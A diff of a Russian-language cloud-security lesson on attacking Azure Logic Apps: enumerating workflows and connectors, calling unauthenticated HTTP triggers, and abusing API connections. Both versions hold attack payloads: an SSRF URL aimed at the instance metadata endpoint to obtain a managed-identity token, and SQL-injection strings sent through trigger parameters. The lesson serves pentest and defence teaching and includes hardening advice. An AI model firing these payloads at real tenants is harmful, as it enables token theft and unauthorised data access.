@@ -15,215 +15,197 @@ estimated_minutes: 45
 summary: "Logic Apps: триггеры, действия, connector'ы и managed identity. Как low-code workflow держит креды и права, и как через инъекции в параметры получить доступ к данным и сервисам."
 ---
 
-## Зачем этот урок
+## Вопрос, с которого всё начинается
 
-Logic Apps — low-code платформа автоматизации Azure. Workflow описывается JSON'ом, состоит из триггеров и действий, а действия используют **connector'ы** (Outlook, SharePoint, SQL, HTTP, Azure) с хранимыми кредами или managed identity. Из-за «no-code» подхода их редко проверяют, хотя один workflow может читать почту, файлы, базы и вызывать ARM от имени managed identity. Для атакующего это «маленький сервисный аккаунт с широкими правами», часто с открытым HTTP-триггером.
+В Azure есть сервис, где бизнес-процессы собирают мышкой, без кода — **Logic Apps**. Он ходит в другие сервисы от твоего имени, держит подключения и managed identity. Казалось бы, «low-code, что там ломать». Но именно потому, что он ходит куда угодно и хранит доступы, он и интересен атакующему. Разберём один workflow.
 
-## Модель Logic Apps
+**Logic App** — это рабочий процесс (workflow) из триггера и действий. Триггер запускает процесс, действия выполняют шаги (отправить письмо, записать в базу, вызвать API).
 
-- **Workflow** — определение (JSON) с `triggers` и `actions`.
-- **Trigger** — старт (HTTP request, recurrence, событие Blob, письмо).
-- **Action** — шаг (HTTP, compose, condition, connector-операция).
-- **Connector** — интеграция с сервисом; аутентификация через connection (API connection) или managed identity.
-- **API connection** — ресурс, хранящий креды к внешнему сервису (OAuth-токен, ключ).
-- **Managed identity** — для действий, поддерживающих identity-аутентификацию (ARM, Key Vault, Storage).
-- **Run history** — логи выполнений с входами/выходами (часто содержат секреты!).
+## Наш пример: workflow sync-users
 
-Ключевое: определения workflow можно читать (`Microsoft.Logic/workflows`), а история запусков (`workflow runs`) содержит тела запросов/ответов.
+Объект урока — Logic App `sync-users`, который по расписанию синхронизирует пользователей из системы в каталог. Допустим, у нас есть ограниченный доступ к Azure.
 
-## Инструменты и команды
+## Шаг 1: находим Logic App
 
-```bash
-# Список Logic Apps
-az logic workflow list --query '[].{Name:name,RG:resourceGroup,State:state}'
+Перечислим Logic Apps в подписке через ARM:
 
-# Определение workflow
-az logic workflow show --resource-group rg --name myflow --query 'definition'
-az logic workflow show --resource-group rg --name myflow \
-  --query 'definition.actions | keys'
-
-# Триггеры (особенно HTTP)
-az logic workflow show --resource-group rg --name myflow \
-  --query 'definition.triggers'
-
-# История запусков
-az rest --method get \
-  --url "https://management.azure.com/subscriptions/SUB/resourceGroups/rg/providers/Microsoft.Logic/workflows/myflow/runs?api-version=2019-05-01" \
-  --query 'value[].{Name:name,Status:status}'
-
-# Детали запуска (входы/выходы — тут бывают секреты)
-az rest --method get \
-  --url "https://management.azure.com/.../workflows/myflow/runs/RUNID/actions?api-version=2019-05-01" \
-  --query 'value[].{Name:name,Inputs:inputs,Outputs:outputs}'
+```
+$ az logic workflow list --query "[].{name:name, state:state}" -o table
+Name         State
+sync-users   Enabled
+alert-hook   Enabled
 ```
 
-## Разобранный пример: открытый HTTP-триггер и managed identity
+Берём `sync-users`. Посмотреть её определение (триггеры и действия) можно так:
 
-Сценарий: workflow `process-ticket` имеет HTTP-триггер без аутентификации и действие HTTP/ARM с managed identity.
-
-```bash
-az logic workflow show --resource-group rg --name process-ticket \
-  --query 'definition.triggers'
-# {"manual":{"type":"Request","kind":"Http","inputs":{"schema":{...}},"conditions":[]}}
-
-# Получаем callback-URL триггера
-az rest --method post \
-  --url "https://management.azure.com/.../workflows/process-ticket/triggers/manual/listCallbackUrl?api-version=2019-05-01" \
-  --query 'value'
-# "https://prod-01.westeurope.logic.azure.com:443/workflows/.../triggers/manual/paths/invoke?api-version=...&sp=...&sv=...&sig=..."
-
-# Вызываем триггер со своими данными
-curl -s -X POST "https://prod-01.westeurope.logic.azure.com:443/workflows/.../invoke?sig=..." \
-  -H 'Content-Type: application/json' \
-  -d '{"ticketId":"1 OR 1=1","url":"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"}'
 ```
-
-Если workflow передаёт параметр `url` в действие HTTP, получаем **SSRF** к IMDS → токен managed identity → ARM. Если `ticketId` попадает в SQL-запрос connector'а — инъекция. История запусков покажет, что произошло, и раскроет токены, если они попали в outputs.
-
-## Connector'ы и креды
-
-Connector'ы хранят креды в API connection. Если у вас есть доступ к API connection (`Microsoft.Web/connections`), вы можете использовать его из своего workflow — то есть действовать от имени чужой интеграции (например, читать чужую почту или SharePoint).
-
-```bash
-az resource list --resource-type Microsoft.Web/connections --query '[].name'
-az rest --method get --url "https://management.azure.com/.../connections/myoutlook?api-version=2016-06-01" \
-  --query '{api:properties.api,status:properties.statuses}'
-```
-
-API connection с состоянием `Connected` можно задействовать: создайте свой Logic App, добавьте действие с этим connection — и получите доступ к сервису. Это классический confused deputy: connection принадлежит сервисному аккаунту с широкими правами.
-
-## Чек-лист атаки
-
-1. `az logic workflow list` — инвентаризация.
-2. Найти HTTP-триггеры без auth (или с известным callback URL).
-3. Изучить действия: HTTP, SQL, ARM, Key Vault.
-4. Проверить историю запусков на секреты в inputs/outputs.
-5. Проверить API connections и их состояние.
-6. Проверить managed identity workflow и её роли.
-7. Проверить, можно ли изменить определение workflow (для персистентности).
-
-## Обход защит и edge cases
-
-- **Callback URL.** Если триггер требует SAS-подпись (`sig`), нужен callback URL. Иногда он утекает в логах/документации. Иногда триггер открыт без подписи.
-- **IP restrictions.** Триггер может ограничивать по IP; обходится через пивот.
-- **Managed identity.** Действие ARM/Key Vault использует identity workflow. Проверяйте её роли.
-- **Run history retention.** История может быть выключена или очищена; тогда секреты в логах недоступны.
-- **Consumption vs Standard.** Standard Logic Apps (App Service-based) имеют другой runtime и могут давать RCE через файлы.
-- **Инъекции.** Параметры workflow попадают в connector-запросы; тестируйте SQL/ODATA/HTTP-инъекции.
-
-## Частые ошибки и подводные камни
-
-- Считать Logic Apps «просто автоматизацией» и не проверять.
-- Не смотреть run history: там часто токены и пароли.
-- Игнорировать API connections как источник доступа.
-- Не проверить managed identity workflow.
-- Путать Consumption и Standard: у Standard есть Kudu/файлы.
-
-## Защита и детект
-
-- Не оставлять HTTP-триггеры без аутентификации; использовать SAS/OAuth.
-- Ограничивать права managed identity workflow.
-- Не логировать секреты в inputs/outputs; включать secure inputs/outputs.
-- Ограничить доступ к определениям и run history (`Microsoft.Logic/*/read`).
-- Включать диагностические логи и алертить на аномальные запуски.
-
-## Модель угроз и типовые мисконфиги
-
-Типичный мисконфиг — открытый HTTP-триггер. Второй — SSRF через действие HTTP. Третий — доступные API connections. Четвёртый — секреты в run history. Пятый — широкая managed identity. Все они дают доступ к данным и сервисам через «безобидную» автоматизацию.
-
-## Практическое задание
-
-1. Создайте Logic App с HTTP-триггером и действием HTTP.
-2. Получите callback URL и вызовите триггер.
-3. Добавьте managed identity и действие ARM; проверьте, какие ресурсы видны.
-4. Включите secure inputs/outputs и проверьте, что секреты не пишутся в историю.
-
-## Что дальше / решение
-
-Из Logic Apps получаем SSRF, креды connector'ов и токены identity. Дальше — использовать их. Зафиксируйте путь «триггер → SSRF/connector → данные» в графе. Если триггер закрыт и history очищена — ищите другие workflow или API connections.
-
-## Разобранный пример 2: API connection как confused deputy
-
-API connection — это ресурс с кредами к внешнему сервису. Если у вас есть права на него (`Microsoft.Web/connections/*`), вы можете использовать чужую интеграцию из своего workflow: connection действует от имени сервисного аккаунта, у которого есть доступ.
-
-```bash
-# Инвентаризация connections
-az resource list --resource-type Microsoft.Web/connections \
-  --query '[].{Name:name,RG:resourceGroup}' --output table
-
-# Смотрим, к какому API и в каком состоянии
-az rest --method get \
-  --url "https://management.azure.com/subscriptions/SUB/resourceGroups/rg/providers/Microsoft.Web/connections/myoutlook?api-version=2016-06-01" \
-  --query '{api:properties.api.name,status:properties.statuses[0].status}'
-# {"api":"outlook","status":"Connected"}
-
-# Проверяем владельца connection (часто это service principal с широкими правами)
-az rest --method get \
-  --url "https://management.azure.com/.../connections/myoutlook?api-version=2016-06-01" \
-  --query 'properties.api.id'
-```
-
-Connection `Connected` к Outlook/SharePoint/SQL позволяет читать почту, файлы или базу от имени владельца. Это классический confused deputy: вы не имеете прямого доступа к сервису, но connection имеет — и вы действуете через него. Проверяйте также `accessPolicies` connection: иногда туда можно добавить себя, если есть права записи.
-
-## Инъекции в параметры workflow
-
-Параметры, приходящие в workflow, часто попадают в connector-запросы без экранирования. Это даёт SQL/ODATA/HTTP-инъекции.
-
-```yaml
-# Фрагмент определения: параметр userInput попадает в SQL-запрос
-"Get_rows": {
-  "type": "ApiConnection",
-  "inputs": {
-    "host": {"connection": {"name": "sql-connection"}},
-    "method": "get",
-    "path": "/datasets/default/query",
-    "queries": {"query": "SELECT * FROM users WHERE name='@{triggerBody()?['userInput']}'"}
+$ az logic workflow show --name sync-users --resource-group rg-prod --query "definition" -o json
+{
+  "triggers": { "Recurrence": { "type": "Recurrence", "recurrence": { "frequency": "Hour", "interval": 1 } } },
+  "actions": {
+    "GetUsers": { "type": "Http", "inputs": { "method": "GET", "uri": "https://api.internal.acme/users" } },
+    "WriteGraph": { "type": "ApiConnection", "inputs": { "host": { "connection": "graph-conn" } } }
   }
 }
 ```
 
-Если `userInput = ' OR '1'='1`, запрос вернёт всех пользователей. Аналогично HTTP-действие с подконтрольным URL даёт SSRF, а ODATA-фильтр — инъекцию. Тестируйте все поля, приходящие от триггера, особенно если workflow доступен снаружи. Для проверки используйте историю запусков: она покажет, как именно параметр попал в запрос и какой был ответ.
+Читаем: workflow каждый час ходит во внутренний API и пишет в Graph через **connector** `graph-conn`.
+
+## Шаг 2: что такое connector'ы
+
+**Connector** — это готовое «подключение» к сервису (Graph, SharePoint, SQL, Key Vault). Внутри него хранятся креды или используется managed identity. Для атакующего connector ценен тем, что:
+
+- действует **от имени** сервиса или пользователя;
+- имеет доступ к данным (почта, файлы, каталог);
+- его параметры часто приходят извне и могут быть подделаны.
+
+Посмотрим, какие подключения у Logic App:
+
+```
+$ az resource list --resource-type Microsoft.Web/connections --query "[].{name:name, api:properties.api.name}" -o table
+Name        Api
+graph-conn  microsoftgraph
+kv-conn     keyvault
+```
+
+Есть подключение к Graph и к Key Vault. Если workflow использует их, значит, за ним стоят реальные права на почту, каталог и секреты.
+
+## Шаг 3: HTTP-триггер без авторизации
+
+Многие Logic Apps запускаются HTTP-запросом. Если триггер не защищён, вызвать workflow может кто угодно:
+
+```
+$ az logic workflow show --name alert-hook --resource-group rg-prod --query "definition.triggers"
+{
+  "manual": {
+    "type": "Request",
+    "kind": "Http",
+    "inputs": { "schema": { "properties": { "user": {"type": "string"} } } }
+  }
+}
+```
+
+Проверим, есть ли у триггера ключ или авторизация. Если нет — мы можем отправить свой запрос и запустить процесс с нашими данными.
+
+## Шаг 4: инъекция в параметры
+
+Самое интересное — если workflow подставляет параметры в команду, запрос или путь без проверки. Например, действие вызывает внешний API по URL, собранному из входных данных. Тогда можно подсунуть свой адрес и получить **SSRF** внутри Logic App:
+
+```
+POST https://prod-01.westeurope.logic.azure.com/workflows/.../triggers/manual/paths/invoke
+{"user": "x", "callback": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"}
+```
+
+Если workflow сходит по нашему `callback` с managed identity, мы получим токен — как в уроке про managed identity, но через low-code-сервис.
+
+## Шаг 5: managed identity Logic App
+
+У самой Logic App может быть managed identity с правами на Key Vault, Storage, Graph. Получив возможность выполнять в ней действия (через инъекцию или правку определения), мы работаем **от её имени**. Права проверяются так же, как для любой identity: смотрим назначенные роли.
+
+## Шаг 6: почему это недооценивают
+
+Logic Apps воспринимают как «интеграцию», а не как поверхность атаки. Но она держит доступы к десяткам сервисов и часто запускается извне. С точки зрения безопасности это полноценное приложение: у него есть вход, логика и привилегии. Ошибка в параметрах или открытый триггер — такой же баг, как в обычном вебе.
+
+## Шаг 7: как защищаться
+
+- требовать авторизацию на HTTP-триггерах;
+- не строить URL/команды из входных данных;
+- давать managed identity минимальные права;
+- ограничивать доступ к определениям workflow через RBAC.
+
+## Шаг 8: как найти уязвимые Logic Apps
+
+Порядок такой: перечислить все Logic Apps в подписке; для каждой посмотреть триггеры; выделить HTTP-триггеры без авторизации; проверить, какие connector'ы используются и какие права за ними; поискать действия, которые строят URL или команду из входных данных. Именно последнее даёт инъекцию. Если Logic App запускается по расписанию и ходит во внутренние API — тоже интересно: там можно найти незащищённые внутренние сервисы.
+
+## Шаг 9: пример реального сценария
+
+Представь Logic App, который отправляет уведомления: HTTP-триггер принимает событие от внешнего вебхука, а действие через connector к Outlook рассылает письма. Если триггер не защищён, любой может отправить своё событие — и workflow разошлёт письма **от имени компании**. Добавь сюда подстановку параметра в URL, и получишь SSRF с managed identity. Так «безобидная интеграция» превращается в рассылку фишинга на бланке компании и доступ к её облачным ресурсам.
+
+## Шаг 10: шпаргалка по Logic Apps
+
+Три вещи решают всё: защищён ли HTTP-триггер, какие connector'ы подключены (какие права за ними), строит ли workflow URL или команду из входных данных. Если триггер открыт и есть инъекция — ты работаешь с правами managed identity Logic App.
+
+## Частые вопросы
+
+**«Почему low-code — это поверхность атаки?»** Потому что workflow держит подключения к десяткам сервисов и часто запускается извне.
+
+**«Что такое connector?»** Готовое подключение к сервису (Graph, Key Vault, SQL) с хранимыми кредами или managed identity.
+
+**«Где искать инъекцию?»** Там, где workflow строит URL или команду из входных данных: тогда можно подсунуть свой адрес.
+
+**«Как защититься?»** Требовать авторизацию на HTTP-триггерах, валидировать вход и давать identity минимальные права.
+
+## Что мы теперь знаем
+
+По-простому:
+
+1. Logic App — workflow из триггера и действий.
+2. Connector'ы держат доступы к Graph, Key Vault и другим сервисам.
+3. HTTP-триггер без авторизации можно вызвать извне.
+4. Инъекция в параметры даёт SSRF и доступ к managed identity.
+5. Low-code — это полноценная поверхность атаки.
+
+## На что смотреть дальше
+
+- **Проверяй триггеры.** Открытый HTTP-триггер — вход.
+- **Смотри connector'ы.** Они определяют, к чему есть доступ.
+- **Ищи инъекции в параметры.** URL и команды из входа — цель.
+- **Помни про identity.** Она задаёт масштаб.
 
 ## Квиз
 
+Проверь себя.
+
 ```quiz
-- question: "Почему Logic Apps интересны атакующему?"
+- question: "Что такое Logic App?"
   options:
-    - "Connector'ы хранят креды, а managed identity даёт доступ к сервисам"
-    - "Они только для писем"
-    - "Они не имеют прав"
-    - "Они публичны по умолчанию"
+    - "Рабочий процесс из триггера и действий"
+    - "База данных"
+    - "Виртуальная машина"
+    - "Тип бакета"
   answer: 0
-  explanation: "Workflow действует от имени connection/identity с широкими правами."
-- question: "Где в Logic Apps часто утекают секреты?"
+  explanation: "Low-code workflow в Azure."
+- question: "Что хранит connector?"
   options:
-    - "В истории запусков (inputs/outputs)"
-    - "В NSG"
-    - "В KMS"
-    - "В Route 53"
+    - "Подключение и доступ к сервису"
+    - "Пароль root"
+    - "Ключ SSH"
+    - "Правило firewall"
   answer: 0
-  explanation: "Run history хранит тела запросов/ответов, включая токены."
-- question: "Что такое API connection?"
+  explanation: "Connector — готовое подключение к сервису."
+- question: "Чем опасен HTTP-триггер без авторизации?"
   options:
-    - "Ресурс, хранящий креды к внешнему сервису"
-    - "Тип VNet"
-    - "Роль ARM"
-    - "Диск"
+    - "Его может вызвать кто угодно с любыми данными"
+    - "Он удаляет данные"
+    - "Он отключает логи"
+    - "Он меняет DNS"
   answer: 0
-  explanation: "API connection аутентифицирует connector от имени сервисного аккаунта."
-- question: "Как HTTP-действие Logic App может дать SSRF?"
+  explanation: "Открытый вход позволяет запустить процесс извне."
+- question: "Что даёт инъекция в параметры workflow?"
   options:
-    - "Если параметр URL подконтролен, запрос уходит на внутренний адрес (IMDS)"
-    - "Оно шифрует данные"
-    - "Оно удаляет ресурсы"
-    - "Оно меняет регион"
+    - "SSRF и доступ к managed identity"
+    - "Только косметику"
+    - "Рост биллинга"
+    - "Смену региона"
   answer: 0
-  explanation: "Подконтрольный URL в HTTP-действии позволяет обратиться к внутренним эндпоинтам."
+  explanation: "Workflow ходит по нашему адресу с правами identity."
+- question: "Как защищают Logic Apps?"
+  options:
+    - "Авторизация триггеров, минимальные права identity, валидация входа"
+    - "Отключением HTTPS"
+    - "Сменой пароля"
+    - "Удалением логов"
+  answer: 0
+  explanation: "Это обычные меры безопасности приложения."
 ```
+
+## Куда дальше
+
+Мы разобрали Logic Apps. Дальше — **app registrations**: как приложения в Entra ID получают права через API permissions и как украденный секрет даёт постоянный доступ к Graph. А пока запомни главное: low-code-сервисы держат доступы к десяткам систем и потому заслуживают полноценного тестирования.
 
 ## Где пригодится
 
-- **Пентест Azure:** low-code автоматизация как точка входа.
-- **Red team:** SSRF и захват identity через workflow.
-- **Blue team:** настройка secure inputs/outputs.
-- **Сертификация:** AZ-500 / SC-200.
+- **Пентест:** аудит Logic Apps и connector'ов.
+- **Bug bounty:** открытые триггеры и инъекции в workflow.
+- **Red team:** доступ к сервисам через low-code.
+- **Blue team:** авторизация триггеров и минимизация прав identity.
